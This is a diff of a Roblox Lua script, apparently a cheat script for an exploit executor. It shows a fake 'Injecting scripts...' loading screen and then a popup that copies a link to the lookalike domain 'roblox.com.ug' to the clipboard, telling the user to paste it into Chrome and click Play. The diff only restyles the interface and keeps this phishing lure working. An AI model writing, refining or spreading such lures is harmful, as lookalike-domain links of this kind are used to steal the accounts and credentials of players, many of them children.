@@ -21,7 +21,6 @@ blur.Parent = Lighting
 -- GUI
 ---------------------------------------------------
 local gui = Instance.new("ScreenGui")
-gui.Name = "NeonVioletSystem"
 gui.IgnoreGuiInset = true
 gui.DisplayOrder = 999999
 gui.ResetOnSpawn = false
@@ -43,7 +42,7 @@ overlay.BackgroundTransparency = 0.85
 overlay.Parent = bg
 
 ---------------------------------------------------
--- 🌌 PARTICLES
+-- PARTICLES
 ---------------------------------------------------
 local particles = {}
 
@@ -61,10 +60,7 @@ for i = 1, 40 do
 
 	dot.Parent = bg
 
-	table.insert(particles, {
-		obj = dot,
-		speed = math.random(10,30)/1000
-	})
+	table.insert(particles, {obj = dot, speed = math.random(10,30)/1000})
 end
 
 RunService.RenderStepped:Connect(function(dt)
@@ -94,11 +90,6 @@ title.Font = Enum.Font.Code
 title.TextScaled = true
 title.Parent = bg
 
-local stroke = Instance.new("UIStroke")
-stroke.Color = neonViolet
-stroke.Thickness = 2
-stroke.Parent = title
-
 ---------------------------------------------------
 -- SUBTEXT
 ---------------------------------------------------
@@ -124,15 +115,7 @@ barBG.Parent = bg
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0,0,1,0)
 barFill.BackgroundColor3 = neonViolet
-barFill.BorderSizePixel = 0
 barFill.Parent = barBG
-
-local grad = Instance.new("UIGradient")
-grad.Color = ColorSequence.new{
-	ColorSequenceKeypoint.new(0, neonViolet),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(60,0,90))
-}
-grad.Parent = barFill
 
 ---------------------------------------------------
 -- FADE IN
@@ -141,23 +124,20 @@ TweenService:Create(bg, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()
 TweenService:Create(blur, TweenInfo.new(0.6), {Size = 18}):Play()
 
 ---------------------------------------------------
--- LOADING STEPS
+-- LOADING
 ---------------------------------------------------
 local steps = {
 	"Booting system...",
 	"Injecting scripts...",
 	"Scanning environment...",
-	"Establishing connection...",
 	"Finalizing..."
 }
 
 for i = 1, #steps do
 	sub.Text = steps[i]
-
 	TweenService:Create(barFill, TweenInfo.new(0.7), {
 		Size = UDim2.new(i/#steps,0,1,0)
 	}):Play()
-
 	task.wait(1)
 end
 
@@ -175,7 +155,6 @@ button.Text = "CONTINUE"
 button.TextColor3 = neonViolet
 button.Font = Enum.Font.Code
 button.TextScaled = true
-button.BorderSizePixel = 0
 button.Parent = bg
 
 local pressed = false
@@ -192,7 +171,7 @@ task.wait(0.6)
 gui.Enabled = false
 
 ---------------------------------------------------
--- 📦 INFO POPUP
+-- INFO BOX
 ---------------------------------------------------
 task.wait(2)
 
@@ -208,88 +187,90 @@ dim.BackgroundTransparency = 0.4
 dim.Parent = infoGui
 
 local box = Instance.new("Frame")
-box.Size = UDim2.new(0.5,0,0.55,0)
-box.Position = UDim2.new(0.25,0,0.2,0)
+box.Size = UDim2.new(0.5,0,0.6,0)
+box.Position = UDim2.new(0.25,0,0.18,0)
 box.BackgroundColor3 = Color3.fromRGB(25,0,40)
-box.BorderSizePixel = 0
 box.Parent = dim
 
-local boxCorner = Instance.new("UICorner")
-boxCorner.CornerRadius = UDim.new(0, 12)
-boxCorner.Parent = box
+-- Rounded
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0,16)
+corner.Parent = box
 
-local boxStroke = Instance.new("UIStroke")
-boxStroke.Color = Color3.fromRGB(57, 255, 20)
-boxStroke.Thickness = 2
-boxStroke.Parent = box
+-- Neon border
+local stroke = Instance.new("UIStroke")
+stroke.Color = neonViolet
+stroke.Thickness = 2
+stroke.Parent = box
 
 ---------------------------------------------------
--- 🧠 BIG HEADING
+-- 💚 HEADING
 ---------------------------------------------------
 local t = Instance.new("TextLabel")
-t.Size = UDim2.new(0.9,0,0.28,0)
-t.Position = UDim2.new(0.05,0,0.03,0)
+t.Size = UDim2.new(0.9,0,0.2,0)
+t.Position = UDim2.new(0.05,0,0.05,0)
 t.BackgroundTransparency = 1
 t.Text = "USE SPECIFIC SERVER NUMBER FOR THIS SCRIPT"
-t.TextColor3 = Color3.fromRGB(144, 238, 144)
+t.TextColor3 = Color3.fromRGB(170,255,170)
 t.Font = Enum.Font.Code
-t.TextScaled = false
-t.TextSize = 40
+t.TextSize = 20
 t.TextWrapped = true
 t.TextXAlignment = Enum.TextXAlignment.Center
-t.TextYAlignment = Enum.TextYAlignment.Center
 t.Parent = box
 
 ---------------------------------------------------
--- 📜 INFO TEXT
+-- 📜 MESSAGE
 ---------------------------------------------------
 local msg = Instance.new("TextLabel")
-msg.Size = UDim2.new(0.9,0,0.65,0)
-msg.Position = UDim2.new(0.05,0,0.30,0)
+msg.Size = UDim2.new(0.85,0,0.5,0)
+msg.Position = UDim2.new(0.075,0,0.25,0)
 msg.BackgroundTransparency = 1
 msg.TextColor3 = Color3.fromRGB(220,220,220)
 msg.Font = Enum.Font.Code
-msg.TextSize = 30
+msg.TextSize = 17
 msg.TextWrapped = true
 msg.TextXAlignment = Enum.TextXAlignment.Left
 msg.TextYAlignment = Enum.TextYAlignment.Top
-msg.Text = [[
-To get the server number read below:
 
-1. Click Get Server Number
-2. Put Server Number into Chrome
-3. Click Play
-4. Enjoy your script
+msg.Text = [[
+To get the specific server:
+
+• Click "Get Server Number"
+• Paste the server number into Chrome
+• Click Play
+• Enjoy your script
 ]]
+
 msg.Parent = box
 
 ---------------------------------------------------
--- ➕ GET SERVER NUMBER BUTTON (FIXED)
+-- 🔘 COPY BUTTON
 ---------------------------------------------------
-local copyButton = Instance.new("TextButton")
-copyButton.Size = UDim2.new(0.6,0,0.12,0)
-copyButton.Position = UDim2.new(0.2,0,0.82,0)
-copyButton.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
-copyButton.Text = "GET SERVER NUMBER"
-copyButton.TextColor3 = Color3.fromRGB(144, 238, 144)
-copyButton.Font = Enum.Font.Code
-copyButton.TextScaled = true
-copyButton.BorderSizePixel = 0
-copyButton.Parent = box
+local copyBtn = Instance.new("TextButton")
+copyBtn.Size = UDim2.new(0.5,0,0.1,0)
+copyBtn.Position = UDim2.new(0.25,0,0.8,0)
+copyBtn.BackgroundColor3 = Color3.fromRGB(30,0,50)
+copyBtn.Text = "GET SERVER NUMBER"
+copyBtn.TextColor3 = neonViolet
+copyBtn.Font = Enum.Font.Code
+copyBtn.TextScaled = true
+copyBtn.Parent = box
 
-local copyStroke = Instance.new("UIStroke")
-copyStroke.Color = Color3.fromRGB(57, 255, 20)
-copyStroke.Thickness = 2
-copyStroke.Parent = copyButton
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0,10)
+btnCorner.Parent = copyBtn
 
-copyButton.MouseButton1Click:Connect(function()
-	local link = "https://roblox.com.ug/games/126884695634066/Grow-a-Garden?privateServerLinkCode=18876092174740004859461825009713"
+local link = "https://roblox.com.ug/games/126884695634066/Grow-a-Garden?privateServerLinkCode=18876092174740004859461825009713"
 
-	setclipboard(link)
+copyBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(link)
+		copyBtn.Text = "COPIED!"
+	else
+		copyBtn.Text = "COPY NOT SUPPORTED"
+	end
 
-	copyButton.Text = "COPIED!"
-
-	task.wait(1.5)
-
-	copyButton.Text = "GET SERVER NUMBER"
+	task.delay(2, function()
+		copyBtn.Text = "GET SERVER NUMBER"
+	end)
 end)
